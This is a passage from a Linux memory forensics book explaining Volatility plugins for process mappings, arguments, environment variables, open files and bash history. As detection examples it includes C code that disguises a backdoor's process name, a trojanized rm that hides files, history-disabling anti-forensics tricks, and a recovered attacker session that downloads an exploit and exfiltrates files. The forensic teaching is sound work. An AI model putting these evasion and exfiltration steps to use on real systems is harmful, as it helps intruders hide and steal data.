1   0x0000000001dc1000 0x0000000001dc20e000 rw-    0x0     0   0            0  
[heap]
1   0x00007c98f080b18000 0x00007c98f080b1a000 r-x    0x0     8   1       130572 
/lib/x86_64-linux-gnu/libdl-2.13.so
1   0x00007c98f080b1a000 0x00007c98f080d1a000 ---    0x2000  8   1       130572 
/lib/x86_64-linux-gnu/libdl-2.13.so
1   0x00007c98f080d1a000 0x00007c98f080d1b000 r--    0x2000  8   1       130572 
/lib/x86_64-linux-gnu/libdl-2.13.so

[snip]

1   0x00007f9881727000 0x00007f9881728000 rw-    0x0     0   0            0
1   0x00007fff23e5f000 0x00007fff23e81000 rw-    0x0     0   0            0 
[stack]
1   0x00007fff23fdc000 0x00007fff23fdd000 r-x    0x0     0   0            0
```

While examining the output, you can see that the `init` process is mapped from /`sbin/init`, that one of the libraries it uses is `libdl`, and that Volatility can locate the memory ranges of the stack and the heap. The output also contains the starting and ending address for each region along with its page permissions, page offset, major and minor number, and inode number.

During incident response, it is often necessary to examine the mappings of a process to look for signs of code injection. For example, if a shared library is loaded out of `/tmp` or is simply not a normal library, then it is immediately suspicious. To quickly look for signs of malicious libraries within processes, you can create a whitelist of all shared libraries on a clean Linux installation. Then script Volatility to report any shared libraries that are not in the whitelist.

Process mappings are also useful for validating where a process is executing from because even userland malware has the capability to manipulate the data shown by the `ps` command. For example, the kernel reads the command-line arguments from the stack of the userland process and exports the results through the `/proc/<pid>/cmdline` file. `ps` then reads this file to gather the arguments. Later in this chapter, you will examine malware that overwrites its own arguments to hide its full path. However, manipulating a process’ memory mappings is more difficult, because the `vm_area_struct` structures are stored within kernel memory.

### Recovering Sections of Memory

During analysis, you will often want to extract the memory mappings of a process. To assist with this effort, Volatility provides the `linux_dump_maps` plugin. You can either dump mappings from all processes, or specify one or more PIDs with the `–p` flag. You can also use the `-s ADDR` option to extract only regions that start at the specified address. You must specify the `-D` option to tell Volatility in which directory to write extracted files.

In the following example, `linux_dump_maps` is used to extract the executable section of the `init` binary from the memory dump:

```
$ python vol.py --profile=LinuxDebian-3_2x64 -f debian.lime linux_dump_map 
      -p 1 -s 0x400000 -D dump
Volatility Foundation Volatility Framework 2.4
Task      VM Start           VM End             Length Path
-------- ------------------ ------------------ ------- ----
       1 0x0000000000400000 0x0000000000409000 0x9000 dump/task.1.0x400000.vma

$ file dump/task.1.0x400000.vma
dump/task.1.0x400000.vma: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), 
    dynamically linked (uses shared libs), stripped
```

In this example, the `–p 1` option filters the plugin to process 1. The `–s 0x400000` option tells the plugin to dump only the one range that starts at `0x400000` (which was obtained from the `linux_proc_maps` output). After extracting the segment, you can run the `file` command and see that you have recovered part of a 64-bit ELF executable.

### Analyzing Command-line Arguments

As previously demonstrated, the `linux_pslist` plugin gathers the name of the running process from the `comm` member of `task_struct`. Unfortunately, this buffer is limited to 16 bytes, which truncates long program names, and does not give any indication about which directory the application is running from or which options were passed to the program on startup.

To recover this additional information, you can use the `linux_psaux` plugin. The plugin gathers arguments by first switching to the process’ address space through the use of the `task_struct.get_process_address_space()` function and then reading from the address pointed to by `mm_struct->arg_start` (the start of the command-line arguments on the process’ stack).

The following shows the output from this plugin on the Debian memory sample:

```
$ python vol.py --profile=LinuxDebian-3_2x64 -f debian.lime linux_psaux
Volatility Foundation Volatility Framework 2.4
Pid    Uid    Gid    Arguments
1      0      0      init [2]
2      0      0      [kthreadd]
3      0      0      [ksoftirqd/0]
5      0      0      [kworker/u:0]
6      0      0      [migration/0]
7      0      0      [watchdog/0]
[snip]
1851   0      0      dhclient -v -pf /run/dhclient.eth0.pid \ 
                    -lf /var/lib/dhcp/dhclient.eth0.leases eth0
2061   0      0      /usr/sbin/rsyslogd -c5
2094   0      0      [flush-8:0]
2101   0      0      /usr/sbin/acpid
2137   0      0      /usr/sbin/apache2 -k start
2140   33     33     /usr/sbin/apache2 -k start
2381   104    107    /usr/lib/postgresql/9.1/bin/postgres \
                      -D /var/lib/postgresql/9.1/main \
                      -c config_file=/etc/postgresql/9.1/main/postgresql.conf
2384   104    107    postgres: writer process
2385   104    107    postgres: wal writer process
2386   104    107    postgres: autovacuum launcher process
8643   0      0      insmod ./lime-3.2.0-4-amd64.ko format=lime path=debian.lime
```

In the output, you can see that several processes have important configuration options, such as the `postgres` configuration file and working directory, and the arguments given to `LiME` to acquire the memory sample that is being analyzed. Malicious processes often read configuration parameters from the command line also, and in those instances you can use `linux_psaux` to recover information about the specific infection. The following shows output from a case we analyzed involving a userland, network-capable backdoor:

```
$ python vol.py --profile=LinuxSuse-2_6_26x64 -f infected.lime 
    linux_psaux -p 27394
Volatility Foundation Volatility Framework 2.4
Pid    Uid    Gid    Arguments
27394  0      0      /usr/share/.apt-cache --port=8080 -k 0x34 --silent
```

This particular malware sample used several configuration options to control its runtime behavior. In this case, it was communicating on network port 8080, a common HTTP proxy port, and using a static XOR key of 0x34. Using this information, we could locate network traffic related to the malware and decode its traffic.

### Manipulating Command-line Arguments

As previously mentioned, malware encountered in the wild has manipulated the output of the `ps` command by overwriting command-line arguments. To illustrate how the attack works, first take a look at the part of the kernel source code that is responsible for reading arguments. Specifically, you will find it in the `fs/proc/base.c` file, and it starts with the declaration of the per-process `/proc/<pid>/cmdline` file.

```
static const struct pid_entry tgid_base_stuff[] = {
  <snip>
  INF("cmdline",    S_IRUGO, proc_pid_cmdline),
  <snip>
}
```

This code uses the `INF` macro to create the `cmdline` file and set it as readable by all processes. It also registers the `proc_pid_cmdline` function as the callback for when the file is read. The following shows an abbreviated version of `proc_pid_cmdline` with the parts relevant to acquiring the arguments shown:

```
static int proc_pid_cmdline(struct task_struct *task, char * buffer) {
    <snip>
    len = mm->arg_end - mm->arg_start;
    <snip>  
    res = access_process_vm(task, mm->arg_start, buffer, len, 0);
}
```

In the function, `task` is the target process, and `buffer` is a pointer to the destination buffer. The size of the arguments is calculated by subtracting the pointer to the end of the arguments from the pointer to the start of the arguments. The data is then read using the `access_process_vm` function, which safely reads memory from a process’ address space.

The following example code creates a process named `backdoor` with a single command-line argument that appears as `apache2 -k start` in `ps` output:

```
#include <stdio.h>
int main(int argc, char *argv[])
{
    char *my_args = "apache2\x00-k\x00start\x00";
    memcpy(argv[0], my_args, 17);
    while(1)
        sleep(1000);
}
```

This code operates by declaring a static command line of `apache2`, `-k`, and `start` separated by NULL (`\x00`) bytes. The original program name and arguments are then overwritten. This has the effect of hiding the malware name from `ps`:

```
$ /tmp/backdoor arg1 &
[1] 24896
$ cat /proc/24896/cmdline | xxd
0000000: 6170 6163 6865 3200 2d6b 0073 7461 7274  apache2.-k.start
0000010: 00                                       .
$ ps aux | grep 24896
vol     24896  0.0  0.0   3932   316 pts/2    S    10:00   0:00 apache2 -k start
```

This output shows `/tmp/backdoor` being executed with a PID of 24896, and `ps` reporting its name to be `apache2 -k start`.

You will now see how this malware technique changes the data seen during memory analysis. First, the command-line arguments are examined with `linux_psaux`:

```
$ python vol.py --profile=LinuxDebian-3_2x64 -f hiddenargs.lime
       linux_psaux -p 24896
Volatility Foundation Volatility Framework 2.4
Pid    Uid    Gid    Arguments
24896  1005   1005   apache2 -k start
```

As you saw on the live system, the arguments are overwritten in userland. Because `linux_psaux` uses these same data structures to retrieve arguments, you have to compare its output with `linux_proc_maps` to find proof of the manipulation:

```
$ python vol.py --profile=LinuxDebian-3_2x64 -f hiddenargs.lime
     linux_pslist -p 24896
Volatility Foundation Volatility Framework 2.4
Offset             Name      Pid    Uid  Gid  DTB        Start Time
------------------ --------- -----  ---- ---  ---------- -------------------
0xffff880036e3d550 backdoor  24896  1005 1005 0x3d50e000 2013-11-20 16:00:40 

$ python vol.py --profile=LinuxDebian-3_2x64 -f hiddenargs.lime
    linux_proc_maps -p 24896
Volatility Foundation Volatility Framework 2.4
Pid      Start    End      Flags Pgoff Major  Minor Inode   File Path
-------- -------  -------- ----- ----- -----  ----- ------  ----------------
   24896 0x400000 0x401000 r-x   0x0   8      1     1059161 /tmp/backdoor
   24896 0x600000 0x601000 rw-   0x0   8      1     1059161 /tmp/backdoor
<snip>
```

In the output of these plugins, you can see that `linux_pslist` reports `backdoor` as the process name and that the full path to the backdoor is `/tmp/backdoor`. Checking for discrepancies between `linux_pslist` and `linux_psaux` output can be trivially automated using Volatility.

---

**NOTE**

Chapter 27 describes how the Phalanx 2 rootkit overwrites process names to hide from system administrators and live forensics analysis.

---

## Process Environment Variables

A process’ initial set of environment variables is passed as the third parameter to the program’s `main` function. These variables are stored in a statically allocated buffer of null-terminated strings. Even if the process doesn’t reference the variables at runtime, the kernel still tracks their addresses. Thus, you can use the `linux_psenv` plugin to find and print the values of the variables. This plugin operates the same way as `linux_psaux`, except that it leverages the `mm_struct->env_start` and `mm_struct->env_end` members to locate the information. Here is an example:

```
$ python vol.py --profile=LinuxDebian-3_2x64 -f debian.lime linux_psenv
Volatility Foundation Volatility Framework 2.4
Name              Pid    Environment
init              1      HOME=/ init=/sbin/init TERM=linux 
         BOOT_IMAGE=/boot/vmlinuz-3.2.0-4-amd64 
         PATH=/sbin:/usr/sbin:/bin:/usr/bin PWD=/ rootmnt=/root
kthreadd          2
[snip]
watchdog/0        7
migration/1       8
ksoftirqd/1       10
[snip]
sshd              2358   CONSOLE=/dev/console HOME=/ 
         init=/sbin/init runlevel=2 INIT_VERSION=sysvinit-2.88 
         TERM=linux COLUMNS=80 BOOT_IMAGE=/boot/vmlinuz-3.2.0-4-amd64 
         PATH=/sbin:/usr/sbin:/bin:/usr/bin:/usr/sbin:/sbin 
         RUNLEVEL=2 PREVLEVEL=N SHELL=/bin/sh PWD=/ 
         previous=N LINES=25 rootmnt=/root
postgres          2381   PG_GRANDPARENT_PID=2344 PGLOCALEDIR=/usr/share/locale 
         PGSYSCONFDIR=/etc/postgresql-common PWD=/var/lib/postgresql 
         PGDATA=/var/lib/postgresql/9.1/main
bash              2747   USER=root LOGNAME=root HOME=/root 
         PATH=/usr/sbin:/usr/bin:/sbin:/bin:/usr/bin/X11 
         MAIL=/var/mail/root SHELL=/bin/bash SSH_CLIENT=192.168.174.1 54944 22 
         SSH_CONNECTION=192.168.174.1 54944 192.168.174.169 22 
         SSH_TTY=/dev/pts/0 TERM=xterm LANG=en_US.UTF-8
[snip]
insmod            8643   TERM=xterm SHELL=/bin/bash 
         SSH_CLIENT=192.168.174.1 54944 22 
         SSH_TTY=/dev/pts/0 USER=root MAIL=/var/mail/root 
         PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin 
         PWD=/root/lime LANG=en_US.UTF-8 SHLVL=1 HOME=/root LOGNAME=root 
         SSH_CONNECTION=192.168.174.1 54944 192.168.174.169 22 
         _=/sbin/insmod OLDPWD=/root
```

This output shows several items of interest:

- **Kernel threads don’t have environment variables**: As previously mentioned, some malware will attempt to blend their processes in with kernel threads. You can check for this behavior by looking at the presence (or absence) of environment variables. If variables exist, it isn’t a real kernel thread.
- **Working directories**: There are several variables pointing to the working directory of the daemons inside the `sshd` and `postgres` processes. `OLDPWD` is the directory that the user was in before changing to the current directory.
- **SSH connections**: You can determine that the `bash` and `insmod` processes were spawned over SSH because the `SSH_CONNECTION` environment variable is set with the IP address and port of the connecting user.
- **User logins**: The environment variable `USER` shows that the user `root` is the one logged in over SSH.
- **Full command paths**: The `_` variable (an underscore) tells you the full path of the command that was executed.

---

**NOTE**

As previously stated, the initial set of variables is stored within a statically allocated buffer whose size cannot change and therefore cannot handle the addition or removal of variables at runtime. Thus, variables explicitly set by calling `setenv` are stored in an alternate location. Specifically, `bash` maintains a *dynamic* data structure that contains an application’s environment and that *can* satisfy runtime modifications. You’ll access these dynamic variables in the “Bash Command Hash Table” section later in this chapter.

---

## Open File Handles

The Linux operating system follows the philosophy of “everything is a file” (see [http://ph7spot.com/musings/in-unix-everything-is-a-file](http://ph7spot.com/musings/in-unix-everything-is-a-file)). Thus, handles to files, pipes, sockets, IPC records, and more are simply treated as files and referenced by a file descriptor (integer) within applications. Recovery of these file handles provides a wealth of forensically useful information.

---

## **Analysis Objectives**

Your objectives are these:

- **Determine opened file handles:** Processes interact with the running system by opening file descriptors to files, sockets, pipes, and more. Enumerating this information can help you determine what a process was reading, writing, or communicating with at the time of the memory dump.
- **Understand common file descriptors:** The use of file descriptors (especially `stdin`, `stderr`, and `stdout`) varies greatly between client and server processes. You will learn how to spot these values and determine whether a process’ input and output are being redirected over network sockets.
- **Detect key loggers**: After malware steals keystrokes, it must log them somewhere (unless it sends them immediately over the network). The most common locations are in memory and on disk. If the latter is chosen, you can potentially identify the log file by looking at a process’ open handles.

## **Data Structures**

The following output shows the members of the `file` structure:

```
>>> dt("file")
'file' (208 bytes)
0x0   : f_u                            ['__unnamed_0x8bc2']
0x10  : f_path                         ['path']
0x20  : f_op                           ['pointer', ['file_operations']]
0x28  : f_lock                         ['spinlock']
0x2c  : f_sb_list_cpu                  ['int']
0x30  : f_count                        ['__unnamed_0x3b0']
0x38  : f_flags                        ['unsigned int']
0x3c  : f_mode                         ['unsigned int']
0x40  : f_pos                          ['long long']
0x48  : f_owner                        ['fown_struct']
0x68  : f_cred                         ['pointer', ['cred']]
0x70  : f_ra                           ['file_ra_state']
0x90  : f_version                      ['unsigned long long']
0x98  : f_security                     ['pointer', ['void']]
0xa0  : private_data                   ['pointer', ['void']]
0xa8  : f_ep_links                     ['list_head']
0xb8  : f_tfile_llink                  ['list_head']
0xc8  : f_mapping                      ['pointer', ['address_space']]
```

## **Key Points**

The key points are these:

- `f_path`: Holds a reference to the information needed to reconstruct the name and path of the file.
- `f_mode`: Tells you whether the file was opened for read, write, and/or execute access.
- `f_pos`: The position where the next read or write will occur.
- `f_mapping`: A reference to the `address_space` structure of the file that stores pointers into the page cache. The page cache holds the file’s contents on disk.
- `f_op`: This member identifies a set of file operation pointers for the file descriptor. These operations (functions) are called when a process reads, writes, and seeks, and so on. Later in the book, you will learn how rootkits hook these operations to hide files on live machines.

---

A process’ file descriptors are stored within kernel memory. Each process has a dedicated table with an array of indexes, in which each index is the file descriptor number, and the corresponding value is a pointer to the `file` structure instance. A NULL pointer means that the file descriptor is not in use. To find a process’ file descriptor table, you can examine the `files` member of `task_struct`, which is of type `files_struct`.

The `linux_lsof` plugin walks a process’ file descriptor table and prints the file descriptor number and path for each entry. Here is an example that shows the opened file handles for the `insmod` process that was used to load `LiME`.

```
$ python vol.py --profile=LinuxDebian-3_2x64 -f debian.lime linux_lsof -p 8643
Volatility Foundation Volatility Framework 2.4
Pid      FD       Path
-------- -------- ----
    8643        0 /dev/pts/0
    8643        1 /dev/pts/0
    8643        2 /dev/pts/0
    8643        3 /root/lime/lime-3.2.0-4-amd64.ko
```

In this output, you see that file descriptors 0 (`stdin`), 1 (`stdout`), and 2 (`stderr`) are set to the pseudo terminal of the user and that file descriptor 3 is the kernel module being loaded. The next command analyzes opened file handles of an SSH client:

```
$ python vol.py --profile=LinuxDebian-3_2x64 -f debian.lime linux_lsof -p 2745
Volatility Foundation Volatility Framework 2.4
Pid      FD       Path
-------- -------- ----
    2745        0 /dev/null
    2745        1 /dev/null
    2745        2 /dev/null
    2745        3 socket:[7471]
    2745        4 socket:[6607]
    2745        5 pipe:[6608]
    2745        6 pipe:[6608]
    2745        7 /dev/ptmx
    2745        9 /dev/ptmx
    2745       10 /dev/ptmx
```

The Secure Shell (SSH) client process’ `stdin`, `stdout`, and `stderr` file descriptors are all set to `/dev/null` (which is expected of network applications). Additionally, there are two socket file descriptors with inode numbers 7471 and 6607. By analyzing the process’ network connections with `linux_netstat` you’ll notice an active connection and non-named UNIX socket.

```
$ python vol.py --profile=LinuxDebian-3_2x64 -f debian.lime 
    linux_netstat -p 2745
Volatility Foundation Volatility Framework 2.4
TCP      192.168.174.169:22    192.168.174.1:54944 ESTABLISHED sshd/2745
UNIX     DGRAM   6607   sshd/2745
```

The following shows the file descriptors of a Linux key logger named `logkey` ([http://code.google.com/p/logkeys/](http://code.google.com/p/logkeys/)):

```
$ python vol.py --profile=LinuxDebian-3_2x64 -f keylog.lime 
      linux_pslist | grep logkeys
Volatility Foundation Volatility Framework 2.4
0xffff88003b122fe0 logkeys    8625    0     0  0x3b005000 2013-11-29 13:38:05 

$ python vol.py --profile=LinuxDebian-3_2x64 -f keylog.lime 
      linux_psaux -p 8625
Volatility Foundation Volatility Framework 2.4
Pid    Uid    Gid    Arguments
8625   0      0      ./logkeys -s -o /usr/share/logfile.txt –u

$ python vol.py --profile=LinuxDebian-3_2x64 -f keylog.lime 
      linux_lsof -p 8625
Volatility Foundation Volatility Framework 2.4
Pid      FD       Path
-------- -------- ----
    8625        0 /dev/input/event0
    8625        1 /usr/share/logfile.txt
    8625        2 /dev/pts/1
    8625        3 /usr/share/bash-completion/completions
```

In this output, you can see that `logkeys` is running as PID 8625, and it is configured to log to `/usr/share/logfile.txt`. Examining the file handles shows that file descriptor 1 is the log file, and descriptor 0 is `/dev/input/event0`. The `event0` file is a handle to the keyboard and the key logger reads this file to steal keystrokes from userland.

## Saved Context State

Edwin Smulders submitted a number of Linux plugins to the 2013 Volatility plugin contest: [http://www.volatilityfoundation.org/contest/2013/EdwinSmulders_Symbols.zip](http://www.volatilityfoundation.org/contest/2013/EdwinSmulders_Symbols.zip). These plugins involve enumerating active threads within a memory sample, along with their current execution context. Remember that during a context switch, the state of the currently executing thread is saved so that the registers, page tables, and other information can be restored when the thread is resumed. Edwin’s plugins enable Volatility to recover and analyze this saved state. Here’s a brief description of how you can use Edwin’s plugins:

- `linux_threads`: Each process has one or more threads that execute distinct units of code. This plugin identifies the threads by their thread ID and provides the base functionality for the following plugins.
- `linux_info_regs`: During a context switch, the current process state is saved to the kernel stack. Volatility can recover this state to determine previous process activity.
- `linux_process_syscall`: Context switches are often triggered when a thread makes a system call. You can determine which system call the application was making and the parameters sent to the handler.
- `linux_process_stack`: Stack frames contain return addresses, local variables, and function parameters. This plugin recovers stack frames and attempts to determine the symbolic name of the function represented by each frame.

## Bash Memory Analysis

So far in this chapter, you learned how to find processes in memory, isolate their address spaces from the rest of physical memory, and extract individual regions of process memory. In this section, we show how to leverage those capabilities to recover commands that users, adversaries, and automated malware samples enter into bash shells. Because bash is the default user shell on nearly all Linux distributions, extracting commands is extremely valuable and practical.

---

## **Data Structures**

The following code shows the definition of `_hist_entry`, which represents a line of a `.bash_history` file:

```
>>> dt("_hist_entry")
'_hist_entry' (24 bytes)
0x0   : line                           ['pointer', ['String', {'length': 1024}]]
0x8   : timestamp                      ['pointer', ['String', {'length': 1024}]]
0x10  : data                           ['pointer', ['void']]
```

## **Key Points**

The key points are these:

- `line`: The command entered by the user.
- `timestamp`: The time the command was executed, stored as epoch time prefixed with a pound sign (`#`).

---

### Bash History

During normal operations, bash will log commands into the user’s history file (~/.`bash_history`). Attackers obviously don’t want their commands being recorded, so frequently you will encounter attempts to disable such logging. There are a number of ways to do this:

- **History file variable**: Unsetting the `HISTFILE` environment variable or pointing it to `/dev/null`
- **History size variable**: Setting the `HISTSIZE` environment variable to 0
- **SSH parameters**: Logging in using the Linux SSH client with the -`T` parameter set to prevent pseudoterminal allocation

The use of these antiforensics techniques has a very negative effect on disk-forensics, but, as in many other cases, does not affect memory forensics. Even if logging to disk is disabled, bash not only keeps commands in memory but also keeps the time each command executed.

### Linux Bash Plugin

The `linux_bash` plugin recovers _`hist_entry` structures from memory. In particular, it scans the heap for the `#` (pound) characters that prefix each timestamp. Because the timestamps are stored as a string, the plugin then rescans the heap looking for pointers to the pound characters, which are potential `timestamp` members of the structure.

The following output shows the `linux_bash` plugin results for the main `bash` instance from the 2008 DFRWS challenge (see [http://dfrws.org/2008/challenge/submission.shtml](http://dfrws.org/2008/challenge/submission.shtml)). This challenge focused on an attacker that exfiltrated data from a victim organization:

```
$ python vol.py --profile=Linuxdfrws-profilex86 -f challenge.mem
     linux_bash -p 2585
Pid      Name  Command Time                   Command
-------- ----- ------------------------------ -------
    2585 bash  2007-12-17 03:24:21 UTC+0000   unset HISTORY
    2585 bash  2007-12-17 03:24:21 UTC+0000   cd xmodulepath
    2585 bash  2007-12-17 03:24:21 UTC+0000   wget http://metasploit.com/users/
hdm/tools/xmodulepath.tgz
    2585 bash  2007-12-17 03:24:21 UTC+0000   tar -zpxvf xmodulepath.tgz
    2585 bash  2007-12-17 03:24:21 UTC+0000   ./root.sh
    2585 bash  2007-12-17 03:24:21 UTC+0000   id
    2585 bash  2007-12-17 03:24:21 UTC+0000   mkdir temp
    2585 bash  2007-12-17 03:24:21 UTC+0000   cd temp
    2585 bash  2007-12-17 03:24:21 UTC+0000   cp /mnt/hgfs/Admin_share/*.pcap .
    2585 bash  2007-12-17 03:24:21 UTC+0000   cp /mnt/hgfs/Admin_share/*.xls .
    2585 bash  2007-12-17 03:24:21 UTC+0000   cp /mnt/hgfs/Admin_share/
intranet.vsd .
    2585 bash  2007-12-17 03:24:40 UTC+0000   ls /mnt/hgfs/Admin_share/
    2585 bash  2007-12-17 03:26:20 UTC+0000   zip archive.zip 
/mnt/hgfs/Admin_share/acct_prem.xls /mnt/hgfs/Admin_share/domain.xls /mnt/hgfs/Admin_share/ftp.pcap
    2585 bash  2007-12-17 03:26:55 UTC+0000   unset HISTFILE
    2585 bash  2007-12-17 03:26:59 UTC+0000   unset HISTSIZE
    2585 bash  2007-12-17 03:27:46 UTC+0000   zipcloak archive.zip
    2585 bash  2007-12-17 03:28:25 UTC+0000   ll -h
    2585 bash  2007-12-17 03:28:54 UTC+0000   cp /mnt/hgfs/software/xfer.pl .
    2585 bash  2007-12-17 03:28:57 UTC+0000   ll -h
    2585 bash  2007-12-17 03:29:56 UTC+0000   export http_proxy="http:
//219.93.175.67:80"
    2585 bash  2007-12-17 03:30:00 UTC+0000   env | less
    2585 bash  2007-12-17 03:31:56 UTC+0000   ./xfer.pl archive.zip
    2585 bash  2007-12-17 04:32:50 UTC+0000   unset http_proxy
    2585 bash  2007-12-17 04:32:53 UTC+0000   rm xfer.pl
    2585 bash  2007-12-17 04:33:26 UTC+0000   dir
    2585 bash  2007-12-17 04:33:29 UTC+0000   rm archive.zip
```

For the sake of brevity, only the most interesting entries are shown. As you can see, the attacker executed many actions in the following categories:

- **Antiforensics:** The attacker employs several antiforensics techniques, including preventing bash from writing to disk by unsetting the `HISTFILE` and `HISTSIZE` variables and (insecurely) deleting `archive.zip` after exfiltrating it.
- **Privilege escalation:** The Metasploit `xmodulepath` package is an exploit used to gain root privileges on systems with vulnerable X versions.
- **Exfiltration:** Several files are copied to the guest through the VMware guest to host filesystem (`/mnt/hgfs`). They are then packaged and exfiltrated using `xfer.pl`.

It is important to note that when a bash shell opens, it reads saved commands from `~/.bash_history` (if available) and copies them into memory. If the `HISTTIMEFORMAT` variable was set for previous bash sessions, the history file will contain timestamps and that information is also copied into memory. However, if the history file does *not* contain timestamps, then bash assigns a default timestamp of when the bash process started. All commands entered into the new bash session are recorded along with the actual time they were entered. With this point in mind, notice the first several commands all have the same timestamp (`2007-12-17 03:24:21`). In this case, the time indicates when the bash process started, not when the commands executed.

### Bash Command Hash Table

Bash also keeps a hash table that contains the full path to the commands and the number of times they executed. You can view this hash table on a live system with the `hash` command inside of a `bash` shell. Unlike the typical bash history entries, the hash table translates command names to their full path. For example, it stores `/bin/rm` rather than `rm`). Attackers or malicious applications can change a shell’s `PATH` variable and point the user to binaries of the attacker’s choosing. Such activity is immediately obvious through the use of the `linux_bash_hash` plugin.

#### The Fake rm Command

To illustrate the described attack, the source code for an example malicious `rm` binary is shown here:

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main(int argc, char **argv, char **env)
{
    int i;
    char *prefix = "v0l";

    int sz = 255 * sizeof(void *);
    char **args = malloc(sz);
    memset(args, 0x00, sz);
    int argscnt = 0;

    for(i = 0; i < argc; i++)
    {
        if(strncmp(argv[i], prefix, 3) != 0)
        {
            args[argscnt] = argv[i];
            argscnt = argscnt + 1;
        }
    }

    execvp("/bin/rm", args, env);
}
```

The malicious program does not allow files that start with `v0l` to be removed. When the program runs, it enumerates all command-line arguments and builds a new set of arguments, excluding any entries that contain the `v0l` substring. It then executes the real `rm` command with its filtered list.

#### Detecting the Fake Binary

To force a systems administrator to use this binary, an attacker can place it on the file system in a directory such as `/tmp` and then prepend /`tmp` to the victim user’s `PATH` variable. Thus, when the user executes `rm`, it will really be the fake version in `/tmp` instead of the real one in `/bin`. Luckily, the `linux_bash_hash` and `linux_env` plugins can both help you detect this type of attack:

```
$ python vol.py --profile=LinuxDebian-3_2x64 -f backdooredrm.lime 
    linux_bash_hash -p 23971
Volatility Foundation Volatility Framework 2.4
Pid      Name                 Hits   Command                   Full Path
-------- -------------------- ------ ------------------------- ---------
   23971 bash                      1 df                        /bin/df
   23971 bash                      1 rmmod                     /sbin/rmmod
   23971 bash                      1 rm                        /tmp/rm
   23971 bash                      1 vim                       /usr/bin/vim
   23971 bash                      1 cat                       /bin/cat
   23971 bash                      1 insmod                    /sbin/insmod
   23971 bash                      2 ls                        /bin/ls
   23971 bash                      3 clear                     /usr/bin/clear

$ python vol.py --profile=LinuxDebian-3_2x64 -f backdooredrm.lime 
    linux_bash_env -p 23971
Volatility Foundation Volatility Framework 2.4
Pid      Name     Vars
-------- -------- ----
   23971 bash     TERM=xterm SHELL=/bin/bash SSH_CLIENT=192.168.174.1 54634 22 
                  OLDPWD=/root SSH_TTY=/dev/pts/2 USER=root MAIL=/var/mail/root 
PATH=/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin
                  PWD=/root/lime LANG=en_US.UTF-8 HOME=/root LOGNAME=root 
                  SSH_CONNECTION=192.168.174.1 54634 192.168.174.169 22 
                  _=/sbin/insmod
```

In the output from `linux_bash_hash`, there is a listing of `rm` with a full path of `/tmp/rm`. In `linux_bash_env`, the `PATH` variable shows `/tmp` as the first directory to be consulted when looking for applications. In Chapter 24, where you see how to recover file systems from memory, you will revisit this memory sample and learn how to extract the malicious `rm` binary from memory.

In one of our previous cases, attackers altered a privileged user’s `.bashrc` file (presumably by exploiting a client-side vulnerability) and pointed the `PATH` variable into a directory that contained a trojanized `sudo` binary. The malicious `sudo` binary recorded the user’s plaintext password. This technique allowed the adversary to collect the password and elevate privileges along with attempting to move laterally to other systems.

## Summary

Analyzing processes and artifacts you find in process memory is a critical component of memory forensics. By extracting bash history, you can practically see a transcript of every action a remote attacker performed on a victim system. If the history isn’t available for any reason, you can also inspect environment variables, open handles, command-line arguments, and shared libraries for evidence of foul play. You also have the capability to extract specific regions of process memory to separate files on disk. This allows you to analyze them with static analysis tools, scan them with antivirus signatures, and so on.
# Chapter 22 Networking Artifacts

After a network breach, the first questions that must be answered are often the following: Which system was initially infected, which machines were later compromised through lateral movement, and which remote systems were involved in data exfiltration or command and control? Memory forensics is critical to answering these questions because very few of the related artifacts are written to disk. In this chapter, you will learn how this data is stored within Linux memory samples, what you can do to recover it, and how to draw conclusions based on what you find.

## Network Socket File Descriptors

Before you can begin to analyze network information in memory, you must first locate the network socket file descriptors. Because a wide range of items (open file handles, network sockets, pipes, etc.) are represented as file descriptors, Linux provides a common application programming interface (API) for accessing them. By leveraging the data structures of this generic API, you can successfully determine the purpose of a file descriptor.

## **Analysis Objectives**

Your objectives are these:

- **Identify socket file descriptors:** In the previous chapter, you learned how to enumerate a process’ file descriptors. Now, you will learn how to determine which descriptors belong to network sockets.
- **Understand socket operations**: You will learn how the operations structures of a socket affect how the kernel interacts with the socket and processes its data.

## **Data Structures**
# Chapter 23  
 Kernel Memory Artifacts

Many interesting data structures and artifacts that can be useful during the memory analysis process reside within kernel memory. In this chapter, you learn about some of the most commonly analyzed kernel artifacts, including the physical memory maps, kernel debug buffer, and loaded kernel modules. Whether you’re investigating a system compromised by a kernel-level rootkit or simply trying to prove which wireless networks or USB drives a system has recently been interacting with, the data in kernel memory can help you achieve these goals.

## Physical Memory Maps

As described in Chapter 19, Linux maintains a mapping of which devices occupy regions of physical memory. The LiME acquisition tool uses this list to avoid accessing regions that don’t contain system RAM, and the `fmem` tool also indirectly utilizes the list when it calls the `page_is_ram` function. This section describes how to enumerate the physical memory maps and how you can use the information.

---

## **Analysis Objectives**

Your objectives are these:

- **Detect hardware manipulation**: Sophisticated malware can manipulate memory regions that pertain to hardware devices and ultimately change the configuration of the devices. When you find pointers or code hooks that reside outside of system RAM, inspecting the physical memory maps can provide insight into what devices are involved in (or are being targeted by) the malicious activity.
- **Verify memory captures**: As you learned in Chapter 19, most memory acquisition tools typically read only from physical memory ranges that contain system RAM. By comparing the memory maps of your memory sample with the metadata stored in common acquisition formats (such as LiME, EWF, or core dumps), you can verify that the tool is capturing the expected regions.

## **Data Structures**

The `resource` structure holds information about a particular memory region. Here’s how it appears for a 64-bit Debian system:

```
>>> dt("resource")
'resource' (56 bytes)
0x0   : start                          ['unsigned long long']
0x8   : end                            ['unsigned long long']
0x10  : name                           ['pointer', ['char']]
0x18  : flags                          ['unsigned long']
0x20  : parent                         ['pointer', ['resource']]
0x28  : sibling                        ['pointer', ['resource']]
0x30  : child                          ['pointer', ['resource']]
```

## **Key Points**

The key points are these:

- `start`: Starting physical address of the region
- `end`: Ending physical address of the region
- `name`: Name of the region (“System RAM,” “Local APIC,” “PCI BUS,” and so on)
- `sibling`: Pointer to the next `resource` structure within the same level
- `child`: Pointer to the first child `resource`

---

### Hardware Resources

The `linux_iomem` plugin for Volatility displays memory regions in a similar manner as the `cat /proc/iomem` command on a live system. It begins at the root of the device tree (a global variable named `iomem_resource`) and enumerates all of the nodes, which are `resource` structures. Specifically, the plugin recursively walks the tree by processing the `children` and `sibling` pointers. The following shows the output of this plugin against the Debian sample:

```
$ python vol.py --profile=LinuxDebian-3_2x64 -f debian.lime linux_iomem
